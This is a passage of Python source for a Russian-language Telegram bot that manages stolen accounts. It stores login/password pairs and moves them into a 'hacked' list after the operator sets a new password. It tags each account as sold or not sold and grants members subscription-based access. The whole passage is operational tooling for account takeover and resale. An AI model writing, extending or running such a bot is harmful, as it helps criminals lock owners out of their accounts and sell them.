        types.InlineKeyboardButton("➕ Добавить", callback_data="db_add"),
        types.InlineKeyboardButton("🗑 Удалить", callback_data="db_delete"),
        types.InlineKeyboardButton("👁 Просмотр", callback_data="db_view")
    )
    print(f"Отправка данных базы для {chat_id}")
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['adduser'])
def add_user_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /adduser для chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        print(f"Доступ ограничен для /adduser: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3 or not args[2].isdigit():
        print("Неверный формат команды /adduser")
        bot.reply_to(message, "❌ Формат: /adduser <chat_id> <префикс> <дни>\nПример: /adduser 123456789 Админ 30")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    print(f"Пользователь {target_chat_id} добавлен с префиксом {prefix} на {days} дней")
    bot.reply_to(message, f"✅ Пользователь `{target_chat_id}` добавлен с префиксом `{prefix}` на {days} дней!", parse_mode='Markdown')

@bot.message_handler(commands=['addcred'])
def add_cred_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /addcred для chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        print(f"Доступ ограничен для /addcred: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        print("Неверный формат команды /addcred")
        bot.reply_to(message, "❌ Формат: /addcred <логин> <пароль>\nПример: /addcred test test123")
        return
    login, password = args[0], args[1]
    if save_credentials(login, password):
        print(f"Учетные данные добавлены: {login}")
        bot.reply_to(message, f"✅ Логин `{login}` с паролем `{password}` добавлен!", parse_mode='Markdown')
    else:
        print("Ошибка при добавлении учетных данных")
        bot.reply_to(message, "❌ Ошибка при добавлении!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_") or call.data == "add_hacked" or call.data.startswith("hack_cred_"))
def handle_hack_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"Обработка callback для chat_id: {chat_id}, data: {call.data}")
    
    if call.data == "add_hacked":
        print(f"Запрос на добавление нового взломанного аккаунта от {chat_id}")
        msg = bot.edit_message_text("📝 Введите логин и пароль:\nФормат: `<логин> <пароль>`\nПример: `test test123`",
                                  chat_id, call.message.message_id, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        pending_hacked[chat_id] = {'step': 'awaiting_input', 'message_id': msg.message_id}
        return
    
    if call.data.startswith("hack_cred_"):
        parts = call.data.split("_")
        if len(parts) != 4:
            print("Ошибка формата данных в hack_cred")
            bot.answer_callback_query(call.id, "❌ Ошибка формата данных")
            return
        login = parts[2]
        linked_chat_id = parts[3]
        credentials = get_credentials()
        password = next((cred[1] for cred in credentials if cred[0] == login), None)
        if not password:
            print(f"Логин {login} не найден в credentials")
            bot.answer_callback_query(call.id, "❌ Логин не найден")
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("💰 Продан", callback_data=f"hack_{login}_{password}_Продан_{linked_chat_id}"),
            types.InlineKeyboardButton("📦 Не продан", callback_data=f"hack_{login}_{password}_Не продан_{linked_chat_id}")
        )
        print(f"Редактирование сообщения для {chat_id} с выбором статуса")
        bot.edit_message_text(f"🔓 Укажите статус для `{login}`:", chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    
    if call.data.startswith("hack_"):
        parts = call.data.split("_")
        if len(parts) != 5:
            print("Ошибка формата данных в hack")
            bot.answer_callback_query(call.id, "❌ Ошибка формата данных")
            return
        login, old_password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
        user = get_user(chat_id)
        if not user:
            print(f"Пользователь {chat_id} не найден")
            bot.answer_callback_query(call.id, "❌ Пользователь не найден")
            return
        
        msg = bot.edit_message_text(f"🔓 Аккаунт `{login}` со статусом '{sold_status}'.\nВведите новый пароль:",
                                  chat_id, call.message.message_id, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        pending_hacked[chat_id] = {
            'login': login,
            'old_password': old_password,
            'sold_status': sold_status,
            'linked_chat_id': linked_chat_id,
            'message_id': msg.message_id,
            'step': 'awaiting_new_password',
            'from_passwords': call.data.startswith("hack_cred_")
        }
        print(f"Ожидание нового пароля для {login} от {chat_id}")

@bot.message_handler(func=lambda message: str(message.chat.id) in pending_hacked)
def handle_hacked_input(message):
    chat_id = str(message.chat.id)
    print(f"Обработка ввода для взломанного аккаунта от chat_id: {chat_id}")
    if chat_id not in pending_hacked:
        print(f"Нет активного процесса взлома для {chat_id}")
        return
    
    data = pending_hacked[chat_id]
    step = data.get('step')
    
    if step == 'awaiting_input':
        args = message.text.strip().split()
        if len(args) != 2:
            print("Неверный формат ввода для добавления аккаунта")
            bot.reply_to(message, "❌ Формат: `<логин> <пароль>`\nПример: `test test123`", parse_mode='Markdown')
            return
        login, password = args[0], args[1]
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("💰 Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
            types.InlineKeyboardButton("📦 Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
        )
        print(f"Запрос статуса для {login} от {chat_id}")
        bot.reply_to(message, f"🔓 Укажите статус для `{login}`:", reply_markup=markup, parse_mode='Markdown')
        del pending_hacked[chat_id]
    
    elif step == 'awaiting_new_password':
        new_password = message.text.strip()
        login = data['login']
        sold_status = data['sold_status']
        linked_chat_id = data['linked_chat_id']
        user = get_user(chat_id)
        prefix = user['prefix']
        
        if save_hacked_account(login, new_password, prefix, sold_status, linked_chat_id):
            if data.get('from_passwords'):
                delete_credentials(login)  # Удаляем из credentials, если из /passwords
            print(f"Аккаунт {login} добавлен в hacked с новым паролем")
            bot.reply_to(message, f"✅ Аккаунт `{login}` успешно добавлен в взломанные!\n"
                                f"🔒 Новый пароль: `{new_password}`\n"
                                f"💰 Статус: {sold_status}\n"
                                f"👑 Префикс: {prefix}", parse_mode='Markdown')
        else:
            print(f"Ошибка при добавлении аккаунта {login}")
            bot.reply_to(message, "❌ Ошибка при добавлении аккаунта!")
        del pending_hacked[chat_id]
        print(f"Процесс взлома завершен для {chat_id}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
def handle_delete_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"Обработка callback удаления для chat_id: {chat_id}, data: {call.data}")
    
    if call.data.startswith("delete_cred_"):
        login = call.data[len("delete_cred_"):]
        if delete_credentials(login):
            print(f"Логин {login} успешно удален из credentials")
            bot.edit_message_text(f"✅ Логин `{login}` успешно удален из списка паролей!", 
                                 chat_id, call.message.message_id, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            print(f"Ошибка при удалении логина {login} из credentials")
            bot.answer_callback_query(call.id, "❌ Ошибка при удалении!")
    
    elif call.data.startswith("delete_hacked_"):
        login = call.data[len("delete_hacked_"):]
        if delete_hacked_account(login):
            print(f"Логин {login} успешно удален из hacked")
            bot.edit_message_text(f"✅ Логин `{login}` удален из списка взломанных!", 
                                 chat_id, call.message.message_id, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            print(f"Ошибка при удалении логина {login} из hacked")
            bot.answer_callback_query(call.id, "❌ Ошибка при удалении!")

@bot.message_handler(func=lambda message: True)
def unknown_command(message):
    chat_id = str(message.chat.id)
    print(f"Неизвестная команда для chat_id: {chat_id} - {message.text}")
    response = "❌ Неизвестная команда!\nВот список доступных команд:\n" \
               "/start — запустить бота\n" \
               "/menu — главное меню\n" \
               "/getchatid — ваш ID\n" \
               "/support — сообщить об ошибке\n" \
               "Для полного списка используйте /menu"
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"Отправлен ответ на неизвестную команду для {chat_id}")

# === Инициализация и запуск ===
print("Инициализация базы данных при запуске")
init_db()

if __name__ == "__main__":
    print("Запуск бота")
    threading.Thread(target=keep_alive, daemon=True).start()  # Запускаем keep_alive в отдельном потоке
    port = int(os.environ.get('PORT', 10000))  # Получаем порт от Render или используем 10000
    print(f"Запуск Flask на порту {port}")
    app.run(host='0.0.0.0', port=port)  # Запускаем Flask приложение
